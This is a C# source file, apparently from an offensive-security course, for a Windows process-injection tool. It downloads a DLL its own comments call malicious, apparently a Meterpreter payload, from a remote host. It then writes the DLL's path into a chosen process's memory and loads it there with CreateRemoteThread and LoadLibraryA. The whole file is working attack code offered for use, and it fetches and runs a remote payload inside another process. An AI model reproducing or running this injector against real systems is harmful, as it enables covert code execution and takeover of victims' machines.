using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace InjectDLL
{
    
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            // Get current directory and download the malicious DLL. LoadLibrary accepts only files on disk
            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = dir + "\\met_x64.dll";

            WebClient wc = new WebClient();
            wc.DownloadFile("http://192.168.49.70/met_x64.dll", dllName);

            if (args.Length == 0)
            {
                Console.WriteLine($"Usage: inject.exe <Remote PID>");
                return;
            }

            int pid = int.Parse(args[0]);

            // Get handle to explorer.exe, just becuase it is stable
            // Process[] proc = Process.GetProcessesByName("explorer");
            // int pid = proc[0].Id;
            
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            // Allocate RW memory in the remote process so we can put our malicious DLL in memory
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x4);
            
            // Write our malicious DLL to remote process
            IntPtr outSize;
            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
            if (res)
            {
                string remoteProc = (Process.GetProcessById(pid)).ProcessName;
                Console.WriteLine("Succesfully wrote to remote process." +
                    $"PID: {pid} and Name: {remoteProc}");
            }

            // Resolve the memory address of LoadLibraryA in our process. 
            // Since most native Windows DLLs are allocated at the same base address across processes, the address of LoadLibraryA in our current process will be the same as in the remote.
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            if (loadLib != IntPtr.Zero)
            {
                Console.WriteLine($"Found address of LoadLibraryA in our process at address: {loadLib.ToInt64()}");
            }

            // Execute loadlib in the remote process, with the argument of our Shellcode's starting address 
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
            if (hThread != IntPtr.Zero)
            {
                Console.WriteLine($"DLL executed successefully at TID: {hThread.ToInt32()}");
            }
        }
    }
}
